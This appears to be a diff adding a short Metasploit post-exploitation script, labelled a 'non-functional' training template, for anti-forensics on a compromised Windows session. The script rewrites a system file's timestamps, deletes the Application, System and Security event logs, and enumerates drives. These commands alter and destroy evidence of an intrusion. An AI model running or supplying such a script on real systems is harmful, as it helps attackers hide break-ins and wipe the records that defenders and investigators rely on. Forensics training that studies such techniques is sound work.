@@ -1,0 +1,17 @@
+# Timestomp Anti-Forensics Template
+# For Training Use – Non-functional Template
+
+use post/windows/manage/timestomp
+set SESSION <SESSION_ID>
+set FILES C:\\Windows\\System32\\calc.exe
+set MACE 2020-01-01 12:00:00
+run
+
+use post/windows/manage/delete_logs
+set SESSION <SESSION_ID>
+set LOGS Application,System,Security
+run
+
+use post/windows/gather/forensics/enum_drives
+set SESSION <SESSION_ID>
+run
